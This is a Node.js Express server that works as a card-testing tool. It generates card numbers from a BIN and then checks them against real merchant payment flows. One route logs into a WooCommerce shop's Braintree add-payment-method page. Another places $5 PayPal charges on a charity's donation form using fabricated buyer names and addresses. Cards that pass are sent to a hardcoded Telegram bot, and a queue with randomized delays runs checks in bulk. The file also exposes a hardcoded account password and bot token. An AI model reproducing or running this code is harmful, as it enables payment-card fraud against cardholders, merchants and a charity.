const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const DEFAULT_USER = 'asithagunarathna9@gmail.com';
const DEFAULT_PASS = 'gXAetLe84LY7xKP';
const TELEGRAM_TOKEN = '6953499411:AAF52WklFHkwO5qirmadWBeCKh4QfJddlXs';
const TELEGRAM_CHAT = '-1003774370016';

// Background job queue for PayPal checks
const paypalQueue = [];
let isProcessingPaypal = false;

app.get('/api/health', (req, res) => res.json({ ok: true }));

// Generate cards from BIN
app.post('/api/generate', async (req, res) => {
  try {
    const { bin, month = '12', year = '2031', qty = 10 } = req.body;
    const data = new URLSearchParams({
      type: '3', bin, date: 'on', s_date: month, year,
      csv: '', s_csv: '', number: qty.toString(), format: 'pipe'
    });
    const response = await axios.post('https://namsogen.org/ajax.php', data, {
      headers: {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://namsogen.org',
        'referer': 'https://namsogen.org/',
        'user-agent': 'Mozilla/5.0'
      }
    });
    const cards = response.data.split('\n').filter(l => l.includes('|'));
    res.json({ success: true, cards });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// Telegram notification
app.post('/api/telegram', async (req, res) => {
  try {
    const { card, message, botToken, chatId } = req.body;
    const token = botToken || TELEGRAM_TOKEN;
    const chat = chatId || TELEGRAM_CHAT;
    const text = `💳 *APPROVED*\n\`\`\`\n${card}\n\`\`\`\n✅ ${message}\n⏰ ${new Date().toLocaleString()}`;
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chat, text, parse_mode: 'Markdown'
    });
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

// BandC Check
app.post('/api/check', async (req, res) => {
  try {
    const { card } = req.body;
    const [number, month, year, cvc] = card.split('|');
    
    const user = DEFAULT_USER;
    const pass = DEFAULT_PASS;

    const session = axios.create({ withCredentials: true });
    const login = await session.post('https://bandc.com/wp-login.php',
      new URLSearchParams({ log: user, pwd: pass, rememberme: 'forever', 'wp-submit': 'Log In' }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, maxRedirects: 0, validateStatus: s => s < 400 }
    );
    const cookies = login.headers['set-cookie'];
    const page = await session.get('https://bandc.com/my-account/add-payment-method/', {
      headers: cookies ? { Cookie: cookies.join('; ') } : {}
    });
    const match = page.data.match(/"client_token_nonce"\s*:\s*"([^"]+)"/);
    if (!match) return res.status(400).json({ status: 'error', message: 'Nonce not found' });
    
    const tokenRes = await session.post('https://bandc.com/wp-admin/admin-ajax.php',
      new URLSearchParams({ action: 'wc_braintree_credit_card_get_client_token', nonce: match[1] }),
      { headers: { Cookie: cookies ? cookies.join('; ') : '' } }
    );
    const token = tokenRes.data.data;
    const decoded = JSON.parse(Buffer.from(token.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat((4 - token.length % 4) % 4), 'base64').toString());
    const authToken = decoded.authorizationFingerprint;

    const tokenize = await axios.post('https://payments.braintree-api.com/graphql', {
      clientSdkMetadata: { source: 'client', integration: 'custom', sessionId: Date.now().toString() },
      query: 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
      variables: { input: { creditCard: { number, expirationMonth: month, expirationYear: year, cvv: cvc }, options: { validate: false } } },
      operationName: 'TokenizeCreditCard'
    }, { headers: { authorization: `Bearer ${authToken}`, 'braintree-version': '2018-05-10', 'content-type': 'application/json' } });

    if (!tokenize.data.data?.tokenizeCreditCard?.token) {
      return res.json({ status: 'declined', message: 'Tokenization failed' });
    }
    const nonce = tokenize.data.data.tokenizeCreditCard.token;

    const check = await session.post('https://bandc.com/my-account/add-payment-method/',
      new URLSearchParams({
        payment_method: 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc_braintree_credit_card_payment_nonce': nonce,
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        '_wpnonce': 'f262dc06cb',
        woocommerce_add_payment_method: '1'
      }),
      { headers: { Cookie: cookies.join('; ') } }
    );

    const text = check.data;
    let status = 'declined', message = 'Declined';
    if (text.includes('Nice! New payment method added') || text.includes('Payment method successfully added.')) {
      status = 'approved'; message = '1000: Approved';
    } else if (text.includes('risk_threshold')) {
      status = 'risk'; message = 'RISK: Retry this BIN later';
    }

    res.json({ status, message });
  } catch (e) {
    res.json({ status: 'declined', message: e.message });
  }
});

// PayPal Check
app.post('/api/paypal', async (req, res) => {
  try {
    const { card } = req.body;
    const [num, mon, yer, cvc] = card.split('|');
    const year = yer.length === 4 ? yer.slice(-2) : yer;
    
    // Generate fake data
    const firstName = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph'][Math.floor(Math.random() * 8)];
    const lastName = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'][Math.floor(Math.random() * 8)];
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
    const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
    const street = `${Math.floor(Math.random() * 9000 + 100)} ${['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm'][Math.floor(Math.random() * 6)]} St`;
    const city = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia'][Math.floor(Math.random() * 6)];
    const state = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA'][Math.floor(Math.random() * 6)];
    const zip = Math.floor(Math.random() * 90000 + 10000).toString();
    
    // Get card type
    const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
    
    // Step 1: Get form hash from brightercommunities
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    const session = axios.create({ headers: { 'User-Agent': ua } });
    
    const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
    const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
    const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
    const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
    
    if (!hashMatch || !formIdMatch || !prefixMatch) {
      return res.json({ status: 'error', message: 'Form data not found' });
    }
    
    // Step 2: Create PayPal order
    const orderRes = await session.post(
      'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
      new URLSearchParams({
        'give-form-id-prefix': prefixMatch[1],
        'give-form-id': formIdMatch[1],
        'give-form-minimum': '5.00',
        'give-form-hash': hashMatch[1],
        'give-amount': '5.00',
        'give_first': firstName,
        'give_last': lastName,
        'give_email': email
      })
    );
    
    const orderId = orderRes.data?.data?.id;
    if (!orderId) {
      return res.json({ status: 'error', message: 'Order ID not found' });
    }
    
    // Step 3: Pay with card via PayPal GraphQL
    const paypalRes = await session.post(
      'https://www.paypal.com/graphql?fetch_credit_form_submit=',
      {
        query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
          approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
            flags { is3DSecureRequired }
            cart { intent cartId buyer { userId auth { accessToken } } }
            paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
          }
        }`,
        variables: {
          token: orderId,
          card: {
            cardNumber: num,
            type: cardType,
            expirationDate: `${mon}/20${year}`,
            postalCode: zip,
            securityCode: cvc
          },
          phoneNumber: phone,
          firstName: firstName,
          lastName: lastName,
          billingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          shippingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          email: email,
          currencyConversionType: 'PAYPAL'
        }
      },
      { headers: { 'Content-Type': 'application/json' } }
    );
    
    const responseText = JSON.stringify(paypalRes.data);
    
    // Parse response
    let status = 'declined';
    let message = 'Unknown';
    
    if (responseText.includes('accessToken') || responseText.includes('cartId')) {
      status = 'charged';
      message = 'Charged $5.00';
    } else if (responseText.includes('INVALID_SECURITY_CODE')) {
      status = 'cvv';
      message = 'CVV2 Failure';
    } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
      status = 'insufficient';
      message = 'Insufficient Funds';
    } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
      status = 'restricted';
      message = 'Account Restricted';
    } else if (responseText.includes('RISK_DISALLOWED')) {
      status = 'risk';
      message = 'Risk Disallowed';
    } else if (responseText.includes('ISSUER_DATA_NOT_FOUND')) {
      status = 'issuer';
      message = 'Issuer Data Not Found';
    } else if (responseText.includes('ISSUER_DECLINE')) {
      status = 'declined';
      message = 'Issuer Decline';
    } else if (responseText.includes('EXPIRED_CARD')) {
      status = 'expired';
      message = 'Expired Card';
    } else if (responseText.includes('GRAPHQL_VALIDATION_FAILED')) {
      status = 'error';
      message = 'Validation Failed';
    } else {
      status = 'declined';
      message = 'Declined';
    }
    
    res.json({ status, message, card });
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// Background PayPal check queue
app.post('/api/paypal/queue', async (req, res) => {
  const { cards, botToken, chatId } = req.body;
  
  // Add to queue
  cards.forEach(card => {
    paypalQueue.push({ card, botToken, chatId, id: Date.now() + Math.random() });
  });
  
  res.json({ success: true, queued: cards.length, queueSize: paypalQueue.length });
  
  // Start processing if not already
  if (!isProcessingPaypal) {
    processPaypalQueue();
  }
});

// Get queue status
app.get('/api/paypal/queue', (req, res) => {
  res.json({ 
    queueSize: paypalQueue.length, 
    isProcessing: isProcessingPaypal 
  });
});

// Process PayPal queue in background
async function processPaypalQueue() {
  if (paypalQueue.length === 0) {
    isProcessingPaypal = false;
    return;
  }
  
  isProcessingPaypal = true;
  const item = paypalQueue.shift();
  
  try {
    const [num, mon, yer, cvc] = item.card.split('|');
    const year = yer.length === 4 ? yer.slice(-2) : yer;
    
    const firstName = ['James', 'John', 'Robert', 'Michael'][Math.floor(Math.random() * 4)];
    const lastName = ['Smith', 'Johnson', 'Williams', 'Brown'][Math.floor(Math.random() * 4)];
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
    const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
    const street = `${Math.floor(Math.random() * 9000 + 100)} Main St`;
    const city = ['New York', 'Los Angeles', 'Chicago'][Math.floor(Math.random() * 3)];
    const state = ['NY', 'CA', 'IL'][Math.floor(Math.random() * 3)];
    const zip = Math.floor(Math.random() * 90000 + 10000).toString();
    
    const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
    
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
    const session = axios.create({ headers: { 'User-Agent': ua } });
    
    const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
    const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
    const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
    const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
    
    if (!hashMatch || !formIdMatch || !prefixMatch) {
      console.log('PayPal Queue: Form data not found');
      setTimeout(processPaypalQueue, 5000);
      return;
    }
    
    const orderRes = await session.post(
      'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
      new URLSearchParams({
        'give-form-id-prefix': prefixMatch[1],
        'give-form-id': formIdMatch[1],
        'give-form-minimum': '5.00',
        'give-form-hash': hashMatch[1],
        'give-amount': '5.00',
        'give_first': firstName,
        'give_last': lastName,
        'give_email': email
      })
    );
    
    const orderId = orderRes.data?.data?.id;
    if (!orderId) {
      console.log('PayPal Queue: Order ID not found');
      setTimeout(processPaypalQueue, 5000);
      return;
    }
    
    const paypalRes = await session.post(
      'https://www.paypal.com/graphql?fetch_credit_form_submit=',
      {
        query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
          approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
            flags { is3DSecureRequired }
            cart { intent cartId buyer { userId auth { accessToken } } }
          }
        }`,
        variables: {
          token: orderId,
          card: {
            cardNumber: num,
            type: cardType,
            expirationDate: `${mon}/20${year}`,
            postalCode: zip,
            securityCode: cvc
          },
          phoneNumber: phone,
          firstName: firstName,
          lastName: lastName,
          billingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          shippingAddress: {
            givenName: firstName,
            familyName: lastName,
            country: 'US',
            line1: street,
            line2: '',
            city: city,
            state: state,
            postalCode: zip
          },
          email: email,
          currencyConversionType: 'PAYPAL'
        }
      },
      { headers: { 'Content-Type': 'application/json' } }
    );
    
    const responseText = JSON.stringify(paypalRes.data);
    let status = 'declined';
    let message = 'Unknown';
    
    if (responseText.includes('accessToken') || responseText.includes('cartId')) {
      status = 'charged';
      message = 'Charged $5.00';
    } else if (responseText.includes('INVALID_SECURITY_CODE')) {
      status = 'cvv';
      message = 'CVV2 Failure';
    } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
      status = 'insufficient';
      message = 'Insufficient Funds';
    } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
      status = 'restricted';
      message = 'Account Restricted';
    } else if (responseText.includes('RISK_DISALLOWED')) {
      status = 'risk';
      message = 'Risk Disallowed';
    } else if (responseText.includes('ISSUER_DECLINE')) {
      status = 'declined';
      message = 'Issuer Decline';
    } else if (responseText.includes('EXPIRED_CARD')) {
      status = 'expired';
      message = 'Expired Card';
    }
    
    console.log(`PayPal Queue: ${item.card} - ${status}: ${message}`);
    
    // Send Telegram for good cards
    if ((status === 'charged' || status === 'cvv' || status === 'insufficient') && item.botToken) {
      try {
        const text = `💳 *PAYPAL ${status.toUpperCase()}*\n\`\`\`\n${item.card}\n\`\`\`\n✅ ${message}\n⏰ ${new Date().toLocaleString()}`;
        await axios.post(`https://api.telegram.org/bot${item.botToken}/sendMessage`, {
          chat_id: item.chatId, text, parse_mode: 'Markdown'
        });
      } catch (e) {
        console.log('Telegram error:', e.message);
      }
    }
    
  } catch (e) {
    console.log('PayPal Queue Error:', e.message);
  }
  
  // Continue with next card after delay
  setTimeout(processPaypalQueue, 6000 + Math.random() * 4000);
}

// Fallback route
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
